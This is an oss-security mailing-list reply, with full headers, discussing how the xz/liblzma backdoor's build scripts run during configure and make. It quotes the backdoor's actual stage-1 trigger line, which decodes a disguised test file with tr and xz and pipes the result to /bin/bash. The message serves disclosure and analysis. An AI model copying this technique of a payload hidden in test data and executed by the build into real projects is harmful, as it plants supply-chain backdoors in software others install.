Received: (qmail 28615 invoked by uid 550); 30 Mar 2024 23:35:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28582 invoked from network); 30 Mar 2024 23:35:34 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=anarazel.de; h=
	cc:cc:content-type:content-type:date:date:from:from:in-reply-to
	:in-reply-to:message-id:mime-version:references:reply-to:subject
	:subject:to:to; s=fm2; t=1711841725; x=1711928125; bh=3vpg15LaZ2
	t6TQikUUvVkRLkE5htmyoCNSPOFEILtZQ=; b=g+l37MS5hMhmIgNpXZzX9TjxN7
	sGmP2HnXvf9W+tZ+XH1IEZEtjVbiYBOLw5ALnK/vGJTNiLIIMGVqgWcUsn7zZyZ1
	hWSQTtqyW7uDLtWyPQNTk1WM80TSDExkgQdA/HqL2mMHg+yf1GglSWV3wKa+ts0w
	GL7EdzJJZaK4PQKvzRY50HdESGiV9najPZvSPI41Px0AXOE60rlUV5EG3ENOcCQy
	mou5UPoAHDfSwKrLwmU2LgSZcUur6apYlrj3tysFzdtwtlJrAl6+HKjeTwPEnbJq
	iNpBHmn7yI5Bl3pu732+SKN869AY00NEPqwdkRMM3iKbsY5FyptH+sFlfemQ==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=cc:cc:content-type:content-type:date:date
	:feedback-id:feedback-id:from:from:in-reply-to:in-reply-to
	:message-id:mime-version:references:reply-to:subject:subject:to
	:to:x-me-proxy:x-me-proxy:x-me-sender:x-me-sender:x-sasl-enc; s=
	fm2; t=1711841725; x=1711928125; bh=3vpg15LaZ2t6TQikUUvVkRLkE5ht
	myoCNSPOFEILtZQ=; b=SS6mRY/dT54CzPInTK5NrEYS2sj3tSoOaXFUlErUXGsR
	kuTjj0AMVFFS2G3Lq64G1JhhtSRCPrxWe1Zfdh04+BhHAXkBcHlJVYhCaFmY7YZ6
	FC8dcoycXWxkFPlfGODV1UI0xwP97y8mMrMSi/kJiSu5Bd88uMkUbZsvTxh7bpBe
	z8Uy8DFkKmQpUqY+SIZ44IvN3q9Ge+kSG6QwXViBJlx4+w37rquUV4y9RGBMTz4S
	94rK+6pWyzBbRnX4gVsZ9Rl/4Z0gQBRQIUMBTQl+K8+Fv1JOuEficFQ4n43xWM4C
	jDCSxNC5Ak1J0pYhkX1SHDPV9ykytZxHEt8jZRXczg==
X-ME-Sender: <xms:vKEIZqVuk3aQ4NKNmsebL5Cfu6-QUe-ciFoPs1BNMnRHOXIK_OtpPw>
    <xme:vKEIZml2QFAUA087e6Ne5C8Sy1wc7j0OdECSOAJvtLkW12gnu5pkKlHJf8hB9Cd8k
    ukbBycs-fvFha3xqA>
X-ME-Received: <xmr:vKEIZuYYAUR5emtQSK8XZsuWfT558ZHlP3F464rN6X8eLlnX_22TEwpAj-lcZ7YZpZOGx5lNlko0dWm9QouisnMzmVXQpqGtpWwJ7dqAEHT8Nv6hxa9L-Ca86T3c>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvledruddviedgudefucetufdoteggodetrfdotf
    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdfqfgfvpdfurfetoffkrfgpnffqhgen
    uceurghilhhouhhtmecufedttdenucesvcftvggtihhpihgvnhhtshculddquddttddmne
    cujfgurhepfffhvfevuffkfhggtggujgesthdtredttddtvdenucfhrhhomheptehnughr
    vghsucfhrhgvuhhnugcuoegrnhgurhgvshesrghnrghrrgiivghlrdguvgeqnecuggftrf
    grthhtvghrnhepgefhtdevjeelieeihffguddtvdffteefffduledvheeufeegudfftedt
    ueefhedvnecuffhomhgrihhnpehophgvnhifrghllhdrtghomhenucevlhhushhtvghruf
    hiiigvpedtnecurfgrrhgrmhepmhgrihhlfhhrohhmpegrnhgurhgvshesrghnrghrrgii
    vghlrdguvg
X-ME-Proxy: <xmx:vKEIZhWqwZ3zQXtphPMBsXcaVg26CF1ANyYzu7l-gFQyg2fWKlPFrA>
    <xmx:vKEIZkkN5GcFWro3Jt2_YXs_Rrgo7n9UbyxSW2K82pU8xixMckv3fg>
    <xmx:vKEIZmfaOy4thdgktVAgOylVcMVmJnNip7wOhIzFAo8cpcGVBKVo8A>
    <xmx:vKEIZmEZRpHOjTVux3sC_mLM7Kj8avRe1AoCX5GSuV2OQLbq2bS30A>
    <xmx:vaEIZpwa_gcuvJQTwhfE9H9CGWgy5KP1Tal2BRuLGLXhgwemvYiwnQ>
Feedback-ID: id4a34324:Fastmail
Date: Sat, 30 Mar 2024 16:35:22 -0700
From: Andres Freund <andres@anarazel.de>
To: oss-security@lists.openwall.com
Cc: gynvael@coldwind.pl, Solar Designer <solar@openwall.com>
Message-ID: <20240330233522.55vqdjs6gn7dy25n@awork3.anarazel.de>
References: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
 <20240330220009.GA15050@openwall.com>
 <8098d5f1b4c964e077caba5cd3827e90@purelymail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <8098d5f1b4c964e077caba5cd3827e90@purelymail.com>
Subject: Re: [oss-security] backdoor in upstream xz/liblzma leading to ssh
 server compromise

Hi,

On 2024-03-31 00:13:21 +0100, Rein Fernhout (Levitating) wrote:
> Step 3. ./configure is executed
> Step 4. Stage 2 is run from the context of ./configure
> This doesn't extract liblzma_la-crc64-fast.o yet.
> The stage 2 script detects that the Makefile has not been generated yet.

The makefile already exists at that point. However, the script is invoked with
a different working directory (the root of the build tree) in this
invocation. Because of that it goes down the first "if" branch, as
config.status exists in the root of the build tree, and patches
src/liblzma/Makefile.


> sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1
>
> Which executes stage 1 again! This then loads stage 2 and stage 2 is ran for the second time, but this time within the context of the Makefile.
> This time it actually extracts the object file and does the steps Andres explained here:
> https://www.openwall.com/lists/oss-security/2024/03/30/4

> The first part of the stage 2 script actually tests if config.status is present and if so uses it to set some variables needed for the compilation and extraction.

The test for config.status is actually just there to separate the first from
the second invocation. For the second invocation the working directory is
src/liblzma, where there is no config.status, thus execution goes down the
"else" branch, and extracts the object file etc.

Greetings,

Andres Freund
